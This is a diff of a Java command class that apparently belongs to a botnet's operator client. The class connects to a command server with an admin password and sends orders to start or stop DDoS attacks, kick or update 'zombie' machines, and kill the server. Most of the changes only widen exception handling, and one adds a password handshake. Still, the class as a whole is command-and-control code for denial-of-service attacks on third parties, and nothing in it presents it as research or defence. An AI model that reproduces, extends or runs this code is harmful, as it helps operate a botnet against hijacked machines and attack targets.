@@ -57,7 +57,7 @@ public class CommandActions {
 								.writeObject(new DataPackage(command.getCommandArguments()[1]).setMessage("STOP_DDOS"));
 						System.out.println("Stopped DDoS attack on " + command.getCommandArguments()[1] + ".");
 					}
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -83,7 +83,7 @@ public class CommandActions {
 							.writeObject(new DataPackage(
 									(Serializable[]) addresses.toArray(new SocketAddress[addresses.size()]))
 											.setMessage("KICK_ZOMBIES"));
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -122,7 +122,7 @@ public class CommandActions {
 					}
 
 					return addresses.length;
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -209,7 +209,7 @@ public class CommandActions {
 					} catch (InterruptedException e) {
 						e.printStackTrace();
 					}
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -347,7 +347,7 @@ public class CommandActions {
 					while (true) {
 						System.out.println(ClientNetwork.getClient().getInputStream().readObject());
 					}
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (Exception e) {
 					e.printStackTrace();
@@ -369,7 +369,7 @@ public class CommandActions {
 						System.out.println(((DataPackage) ClientNetwork.getClient().getInputStream().readObject())
 								.getObjects()[0]);
 					}
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (Exception e) {
 					e.printStackTrace();
@@ -386,7 +386,7 @@ public class CommandActions {
 				try {
 					ClientNetwork.getClient().getOutputStream()
 							.writeObject(new DataPackage().setMessage("KILL_SERVER"));
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -431,7 +431,7 @@ public class CommandActions {
 								new DataPackage(new InetSocketAddress(split[0], Integer.parseInt(split[1])))
 										.setMessage("UPDATE_ZOMBIE"));
 					}
-				} catch (SocketException e) {
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -446,20 +446,32 @@ public class CommandActions {
 			@Override
 			public Object doJob(Command command) {
 				if (ClientNetwork.getClient() != null) {
-					try {
-						ClientNetwork.getClient().close();
-					} catch (SocketException e) {
-						Exceptions.unconnectedException();
-					} catch (IOException e) {
-						e.printStackTrace();
-					}
-				} else {
 					System.out.println("Already connected; please disconnect first.");
 					return null;
 				}
 				try {
 					ClientNetwork.setClient(new Connection("server2.jacobsrandomsite.com", 25565));
-				} catch (SocketException e) {
+					
+					while (true) {
+						System.out.print("Enter the admin password: ");
+						String password = Console.input.nextLine();
+						try {
+							ClientNetwork.getClient().getOutputStream()
+									.writeObject(new DataPackage(false, password).setMessage("INITIAL_PACKAGE"));
+
+							if (!(boolean) ClientNetwork.getClient().getInputStream().readObject()) {
+								System.out.println("Invalid password.");
+								System.exit(1);
+							} else {
+								break;
+							}
+						} catch (Exception e2) {
+							System.out.println("An exception occurred: " + e2.getMessage() + " ("
+									+ e2.getClass().getSimpleName() + ")");
+							return null;
+						}
+					}
+				} catch (SocketException | NullPointerException e) {
 					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -479,7 +491,7 @@ public class CommandActions {
 					try {
 						ClientNetwork.getClient().close();
 						ClientNetwork.setClient(null);
-					} catch (SocketException e) {
+					} catch (SocketException | NullPointerException e) {
 						Exceptions.unconnectedException();
 					} catch (Exception e) {
 						return null;
